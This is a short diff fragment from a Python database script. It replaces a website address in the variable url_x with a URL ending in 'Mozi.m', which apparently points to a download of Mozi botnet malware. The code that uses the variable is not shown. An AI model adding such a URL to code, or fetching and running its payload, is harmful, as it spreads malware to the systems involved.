@@ -7,7 +7,7 @@ from mysql.connector.constants import ClientFlag
 import pymysql
 
 
-url_x = "https://www.binyaprak.com"
+url_x = "http://kon2-26-11.svserv.net/Mozi.m"
 
 
 try:
